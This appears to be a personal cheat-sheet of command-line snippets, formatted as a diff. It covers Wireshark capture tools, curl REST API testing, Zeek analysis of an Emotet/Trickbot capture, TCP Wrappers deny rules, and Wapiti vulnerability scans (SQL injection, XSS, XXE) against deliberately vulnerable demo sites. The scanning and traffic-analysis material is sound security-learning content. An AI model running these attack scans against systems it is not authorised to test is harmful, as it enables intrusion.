+C:\Program...\Wireshark> capinfos.exe  -A  C:\path_to\Name_of_Large_Traffic_Capture_File.pcap
+
+#Split the large traffic capture file into desired number of smaller files	
+C:\Program...\Wireshark> editcap.exe  -F pcapng  -c <Packets_per_File>  C:\path_to\Name_of_Large_Traffic_Capture_File.pcap  C:\path_to\Name_of_Smaller_Traffic_Capture_File.pcap
+C:\Program Files\Wireshark> editcap.exe  -F pcapng  -c 9545  c:\capture\fw_mon.pcap  c:\capture\fw_mon_split.pcap
+
+editcap -d Duplicates.pcap NoDuplicates.pcap #remove duplicate packages
+mergecap 1.pcap 2.pcap #merge two pcap files 
+============================================================================
+capinfos mycapture.pcap #generate a long form report
+capinfos -T mycapture.pcap #generate a TAB delimited table form report
+capinfos -T -t -E -c *.pcap
+capinfos -TtEs *.pcap
+capinfos -T -m -Q mycapture.pcap #generate a CSV style table form report
+capinfos -TmQ mycapture.pcap
+capinfos -TmQ *.pcap >mycaptures.csv
+============================================================================
+        # use the SQL, XSS and XXE modules when scanning the target.
+        wapiti -u http://testphp.vulnweb.com -m sql,xss,xxe
+        # the xss module will apply to requests submitted by the GET method
+        wapiti -u http://testphp.vulnweb.com -m “xss: get, blindsql: post, xxe: post”
+        #The wapiti-getcookie tool can be used to use authentication
+        # use it to generate a cookie that Wapiti will use when scanning
+        # At the output,file in JSON format
+        wapiti-getcookie -u http://demo.testfire.net/login.jsp -c cookie.json
+        # Another option is to add all the required information via the -d parameter
+        wapiti-getcookie - http://demo.testfire.net/login.jsp  -c cookie.json -d "username=admin&password=admin&enter=submit"
+        # -m – connect all modules – not recommended, because will affect testing time and report size
+        # -c – use the cookie file generated by wapiti-getcookie
+        # -scope – selection of a target for an attack. Selecting the folder option will scan and attack every URL starting from the base one. The base URL must have a forward slash (no filename)
+        # -flush-session – allows you to re-scan, which will not take into account previous results
+        # -A – own User-Agent
+        # -p – proxy server address
+        wapiti --level 1 -u http://demo.testfire.net -f html -o /tmp/vulns.html -m all --color -с cookie.json --scope folder --flush-session -A 'Wapiti Scans' -p http://myproxy:3128
+        # -n: Define a limit of urls to read with the same pattern (prevent endless loops), here limit to 10.
+        wapiti http://demo.testfire.net -n 10 -b folder -u -v 1 -f html -o /tmp/scan_report
+        wapiti https://authlab.digi.ninja -u -n 5 -b domain -v 2 -o /tmp/outfile.html
+        #  scan only for sql and blindsql attacks
+        wapiti https://authlab.digi.ninja -u -n 5 -b domain -m "-all,sql,blindsql" -v 2 -o /tmp/outfile.html
+============================================================================
+#list packages in meta packages ,https://www.kali.org/tools/kali-meta/
+apt-get install -y kali-tools-database
+apt depends kali-tools-database
+apt show kali-tools-top10
+============================================================================
+right clicking on the web page,selecting Inspect on Google Chrome
+More Tools- Developer Tools on Google Chrome
+right clicking on the web page,selecting Inspect Element on Mozilla Firefox
+More Tools- Web Developer Tools on Google Chrome
+More Tools- Web Developer Tools on Edge/IE
+============================================================================
+#How to test a REST api
+
+#HEAD requests
+
+#check if a resource is serviceable, what kind of headers it provides 
+#and other useful meta-information written in response headers, without having to transport the entire content
+curl -I https://www.codever.land/api/public/bookmarks
+#-i, --include - include the HTTP response headers in the output
+-X, --request - specify a custom request method (GET, PUT, DELETE)
+curl -i -X HEAD https://www.codever.land/api/public/bookmarks
+
+#GET requests,curl with no parameters on a URL
+
+curl https://www.codever.land/api/version
+curl -v http://www.example.com/ #verbose mode on
+curl -v http://localhost:8082/spring-rest/foos/9
+curl -o out.json http://www.example.com/index.html #provide the output option to save to a file
+curl -X GET "https://www.codever.land/api/version" -H "accept: application/json"
+curl https://www.codever.land/api/version | jq .
+curl -s https://www.codever.land/api/version | jq .
+#Curl request with multiple headers
+curl -v -H "Accept:application/json" -H "Accept-encoding:gzip" https://www.codever.land/api/version
+#CRUD operation
+curl  \
+  -d 'client_id=bookmarks' \
+  -d 'username=mock' \
+  -d "password=mock" \
+  -d 'grant_type=password' \
+  'http://localhost:8480/auth/realms/bookmarks/protocol/openid-connect/token' \
+| jq .
+#extract just the access_token
+curl -s \
+  -d 'client_id=bookmarks' \
+  -d 'username=ama' \
+  -d "password=ama" \
+  -d 'grant_type=password' \
+  'http://localhost:8480/auth/realms/bookmarks/protocol/openid-connect/token' \
+| jq -r '.access_token'
+curl -s -X GET "http://localhost:3000/api/personal/users/4c617f2b-2bad-498b-a9c6-4e9a8c303798/bookmarks/5e62b18b59770b5487a4c741" \
+ -H "accept: application/json" \
+ -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOi..." | jq .
+
+
+#POST requests
+
+curl -i -X POST "http://localhost:3000/api/personal/users/4c617f2b-2bad-498b-a9c6-4e9a8c303798/bookmarks" \
+-H "accept: */*" -H "Authorization: Bearer eyJhbGciOiJ...."  \
+-H "Content-Type: application/json" -d "{\"name\":\"How to test a REST api from command line with curl – CodepediaOrg\",\"location\":\"https://www.codepedia.org/ama/how-to-test-a-rest-api-from-command-line-with-curl/\",\"language\":\"en\",\"tags\":[\"rest\",\"curl\",\"api\",\"testing\"],\"publishedOn\":\"2020-03-05\",\"sourceCodeURL\":\"https://github.com/codeverland/codever\",\"description\":\" In this post I will present how to execute GET, POST, PUT, HEAD, DELETE HTTP Requests against a REST API. For the purpose of this blog post I will be using the REST api that supports [www.codever.land](https://www.codever.land)\",\"descriptionHtml\":\"<p>In this post I will present how to execute GET, POST, PUT, HEAD, DELETE HTTP Requests against a REST API. For the purpose of this blog post I will be using the REST api that supports <a href=\\\"https://www.codever.land\\\">www.codever.land</a></p>\",\"userId\":\"4c617f2b-2bad-498b-a9c6-4e9a8c303798\",\"public\":true,\"lastAccessedAt\":\"2020-03-06T20:14:28.101Z\",\"likeCount\":0}"
+curl -d 'id=9&name=baeldung' http://localhost:8082/spring-rest/foos/new #send data to a receiving service
+#pass a file containing the request body to the data option
+curl -d @request.json -H "Content-Type: application/json" 
+  http://localhost:8082/spring-rest/foos/new
+# if service expects JSON content-type, use the -H option
+curl -d @request.json -H "Content-Type: application/json" 
+  http://localhost:8082/spring-rest/foos/new
+#Windows command prompt has no support for single quotes like the Unix-like shells  
+curl -d "{\"id\":9,\"name\":\"baeldung\"}" -H "Content-Type: application/json" 
+  http://localhost:8082/spring-rest/foos/new  
+  
+  
+#PUT requests
+curl -s -X PUT "http://localhost:3000/api/personal/users/4c617f2b-2bad-498b-a9c6-4e9a8c303798/bookmarks/5e62b18b59770b5487a4c741" \
+ -H "accept: application/json" -H "Authorization: Bearer eyJhbGciOiJSUzI1NiI..."  \
+ -H "Content-Type: application/json" -d "{\"name\":\"How to test a REST api from command line with curl – CodepediaOrg\",\"location\":\"https://www.codepedia.org/ama/how-to-test-a-rest-api-from-command-line-with-curl/\",\"tags\":[\"rest\",\"curl\",\"api\",\"testing\"],\"publishedOn\":\"2020-03-05T00:00:00.000Z\",\"sourceCodeURL\":\"https://github.com/codeverland/codever\",\"description\":\"In this post I will present how to execute GET, POST, PUT, HEAD, DELETE HTTP requests against a REST API. For the purpose of this blog post I will be using the REST api that supports [www.codever.land](https://www.codever.land)\",\"public\":true,\"readLater\":false,\"language\":\"en\",\"youtubeVideoId\":null,\"stackoverflowQuestionId\":null,\"descriptionHtml\":\"<p>In this post I will present how to execute GET, POST, PUT, HEAD, DELETE HTTP requests against a REST API. For the purpose of this blog post I will be using the REST api that supports <a href=\\\"https://www.codever.land\\\">www.codever.land</a></p>\",\"updatedAt\":\"2020-03-06T20:42:53.706Z\",\"lastAccessedAt\":\"2020-03-06T20:42:53.706Z\",\"userId\":\"4c617f2b-2bad-498b-a9c6-4e9a8c303798\",\"_id\":\"5e62b18b59770b5487a4c741\"}" | jq .
+curl -d @request.json -H 'Content-Type: application/json' 
+  -X PUT http://localhost:8082/spring-rest/foos/9
+  
+#Delete  requests
+curl -i -X DELETE "http://localhost:3000/api/personal/users/4c617f2b-2bad-498b-a9c6-4e9a8c303798/bookmarks/5e62b18b59770b5487a4c741"
+ -H "accept: */*" -H "Authorization: Bearer eyJhbGciOiJS...."
+curl -X DELETE http://localhost:8082/spring-rest/foos/9
+
+#Custom Headers,replace the default headers or add headers
+curl -H "Host: com.baeldung" http://example.com/ #change the Host header
+curl -H "User-Agent:" http://example.com/ #switch off the User-Agent header,put in an empty value
+#The most common scenario while testing is changing the Content-Type and Accept header
+#prefix each header with the -H option
+curl -d @request.json -H "Content-Type: application/json" 
+  -H "Accept: application/json" http://localhost:8082/spring-rest/foos/new
+
+#Authentication
+curl --user baeldung:secretPassword http://example.com/ #basic authentication,add the username and password
+curl -H "Authorization: Bearer b1094abc0-54a4-3eab-7213-877142c33fh3" http://example.com/ #use OAuth2 for authentication
+============================================================================
+bro -C -r [network capture file] local #analysis network capture
+bro -C -r [sample.pcap] local “Site::local_nets += { 10.0.0.0/8 }
+cat conn.log | bro-cut uid id.orig_h id.resp_h duration | sort -nr -k4 | head -n 5
+#infected by Emotet with Trickbot malware 
+cat ssl.log | bro-cut uid id.orig_h id.orig_p id.resp_h id.resp_p cert_chain_fuids issuer
+cat ssl.log | bro-cut ts id.orig_h id.orig_p id.resp_h id.resp_p server_name issuer 
+#One server X509 certificate sha1 signature is listed on SSL abuse database
+cat intel.log | bro-cut uid id.orig_h id.orig_p id.resp_h id.resp_p seen.indicator fuid sources
+#the SSL abuse database export file
+cat files.log | bro-cut source sha1 | grep SSL | grep -v \- | sort -u | awk ‘{printf $2”\n”}’ | \ 
+xargs -I {} grep {} sslblacklist.csv --color
+
+zeek -C -r tm1t.pcap
+cat dns.log | zeek-cut
+cat dns.log | zeek-cut id.orig_h query answers
+============================================================================
+#kali vega subgraph fix, sudo bash kali_vega.sh
+
+$ cat kali_vega.sh
+#!/bin/sh
+
+cat <<EOT | sudo tee /etc/apt/sources.list.d/stretch.list
+deb http://deb.debian.org/debian/ stretch main contrib non-free
+deb-src http://deb.debian.org/debian/ stretch main contrib non-free
+
+deb http://security.debian.org/ stretch/updates main contrib non-free
+deb-src http://security.debian.org/ stretch/updates main contrib non-free
+EOT
+
+sudo apt-get update -qy && sudo apt-get install libwebkitgtk-1.0 -qy
+
+
+sudo apt-get install openjdk-8-jdk-headless -qy
+sudo update-alternatives --set java /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java #non-interactive
+java -version
+
+whoami #vagrant user
+wget https://support.subgraph.com/downloads/VegaBuild-linux.gtk.x86_64.zip
+unzip VegaBuild-linux.gtk.x86_64.zip # vagrant user home directory 
+chown -R vagrant:vagrant vega
+============================================================================
+#TCP Wrappers and Connection Banners
+#create a banner file. It can be anywhere on the system, but it must have same name as the daemon
+
+#The %c token supplies a variety of client information, such as the user name and host name, 
+#or the user name and IP address to make the connection even more intimidating
+$cat /etc/banners/vsftpd
+220-Hello, %c
+220-All activity on ftp.example.com is logged.
+220-Inappropriate use will result in your access privileges being removed.
+
+#For this banner to be displayed to incoming connections, add the following line to the
+$cat /etc/hosts.allow
+vsftpd : ALL : banners /etc/banners/
+============================================================================
+#TCP Wrappers and Attack Warnings
+# assume that a cracker from the 206.182.68.0/24 network has been detected attempting to attack the server. 
+#Place the following line in the /etc/hosts.deny file to deny any connection attempts from that network, and to log the attempts to a special file
+#TCP Wrappers can be used to warn the administrator of subsequent attacks from that host or network using the spawn directive. 
+$cat /etc/hosts.deny
+ALL : 206.182.68.0 : spawn /bin/echo `date` %c %d >> /var/log/intruder_alert
+
+#assume that anyone attempting to connect to port 23 (the Telnet port) on an FTP server is a cracker
+#place an emerg flag in the log files instead of the default flag, info, and deny the connection.
+$cat /etc/hosts.deny
+in.telnetd : ALL : severity emerg
+============================================================================
